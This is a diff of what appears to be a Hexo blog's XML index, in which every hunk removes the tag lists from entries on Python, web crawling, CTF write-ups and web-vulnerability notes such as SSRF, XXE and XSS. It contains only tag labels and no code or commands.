@@ -2647,16 +1766,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Scrapy </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2675,16 +1784,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Scrapy </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2705,16 +1804,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Scrapy </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2733,16 +1822,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> Scrapy </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2763,16 +1842,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> SSRF </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2791,16 +1860,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-            <tag> 协程 </tag>
-            
-            <tag> 异步IO </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2821,16 +1880,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Python </tag>
-            
-            <tag> 多进程 </tag>
-            
-            <tag> 分布式 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2849,16 +1898,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> XXE </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2879,16 +1918,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 漏洞复现 </tag>
-            
-            <tag> DNS </tag>
-            
-            <tag> 域传送 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2907,18 +1936,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 直播 </tag>
-            
-            <tag> 笔记 </tag>
-            
-            <tag> 总结 </tag>
-            
-            <tag> 成长之路 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2939,16 +1956,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> Robots.txt </tag>
-            
-            <tag> 服务器设置问题 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -2967,16 +1974,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> 管理员设置问题 </tag>
-            
-            <tag> Host头 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -2997,14 +1994,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 经验总结 </tag>
-            
-            <tag> HTTP方法 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3023,16 +2012,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> ASP.NET </tag>
-            
-            <tag> 管理员设置问题 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3053,16 +2032,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> IIS </tag>
-            
-            <tag> 信息泄露 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3081,16 +2050,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 被动信息收集 </tag>
-            
-            <tag> pigat </tag>
-            
-            <tag> 聚合工具 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3111,16 +2070,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> 信息泄露 </tag>
-            
-            <tag> 测试目录 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3139,16 +2088,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> 信息泄露 </tag>
-            
-            <tag> 测试文件 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3169,16 +2108,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> 信息泄露 </tag>
-            
-            <tag> 敏感文件 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3197,16 +2126,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> 信息泄露 </tag>
-            
-            <tag> 敏感目录 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3227,16 +2146,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> 信息泄露 </tag>
-            
-            <tag> HTTP </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3255,16 +2164,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> jQuery </tag>
-            
-            <tag> XSS </tag>
-            
-            <tag> 漏洞笔记 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3285,14 +2184,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 漏洞笔记 </tag>
-            
-            <tag> X-Frame-Options </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3311,16 +2202,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> 多线程 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3341,16 +2222,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> 多线程 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3369,16 +2240,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> 多线程 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3399,16 +2260,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> 多线程 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3427,16 +2278,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> 多线程 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3457,16 +2298,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 学习笔记 </tag>
-            
-            <tag> Python </tag>
-            
-            <tag> 多线程 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3485,16 +2316,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 内网渗透 </tag>
-            
-            <tag> CFS </tag>
-            
-            <tag> 比赛 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3515,16 +2336,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 内网渗透 </tag>
-            
-            <tag> CFS </tag>
-            
-            <tag> 比赛 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3543,14 +2354,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 总结 </tag>
-            
-            <tag> 面试 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3571,16 +2374,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 经验总结 </tag>
-            
-            <tag> VPS </tag>
-            
-            <tag> Hexo </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3599,16 +2392,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 比赛 </tag>
-            
-            <tag> CTF </tag>
-            
-            <tag> Writeup </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3629,16 +2412,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Docker </tag>
-            
-            <tag> CTFd </tag>
-            
-            <tag> 环境搭建 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3657,14 +2430,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 思维导图 </tag>
-            
-            <tag> 渗透测试 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3685,16 +2450,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Python </tag>
-            
-            <tag> 批量工具 </tag>
-            
-            <tag> 指纹识别 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3713,16 +2468,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 经验总结 </tag>
-            
-            <tag> 漏洞挖掘 </tag>
-            
-            <tag> 小白 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3743,14 +2488,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> XSS </tag>
-            
-            <tag> 渗透实例 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3769,16 +2506,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-            <tag> 电影 </tag>
-            
-            <tag> 爬虫 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3799,16 +2526,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Python </tag>
-            
-            <tag> 电影 </tag>
-            
-            <tag> 爬虫 </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3827,14 +2544,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> 漏洞复现 </tag>
-            
-            <tag> CVE 2019-0708 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3855,14 +2564,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> 解决方案 </tag>
-            
-            <tag> ssh </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3881,16 +2582,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> BiliBili </tag>
-            
-            <tag> 自适应视频大小 </tag>
-            
-            <tag> 解决方案 </tag>
-            
-        </tags>
       
     </entry>
     
@@ -3911,16 +2602,6 @@
       </categories>
       
       
-        <tags>
-            
-            <tag> Python </tag>
-            
-            <tag> 斗罗大陆 </tag>
-            
-            <tag> GitHub </tag>
-            
-        </tags>
-      
     </entry>
     
     
@@ -3939,18 +2620,6 @@
           
       </categories>
       
-      
-        <tags>
-            
-            <tag> Hexo </tag>
-            
-            <tag> Https </tag>
-            
-            <tag> CloudFlare </tag>
-            
-            <tag> Namesilo </tag>
-            
-        </tags>
       
     </entry>
     
